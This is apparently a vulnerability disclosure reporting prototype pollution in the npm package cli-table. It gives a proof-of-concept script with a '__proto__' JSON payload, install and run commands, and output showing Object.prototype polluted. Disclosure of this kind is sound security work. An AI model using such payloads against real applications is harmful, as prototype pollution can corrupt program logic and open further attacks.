# Description

Prototype Pollution in cli-table

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var cliTable = require("cli-table")
const payload = JSON.parse('{"__proto__":{"polluted":"Yes! Its Polluted"}}');
var obj = {}
console.log("Before : " + {}.polluted);
cliTable(payload);
console.log("After : " + {}.polluted);
```

2. Execute the following commands in terminal:

```
npm i cli-table # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
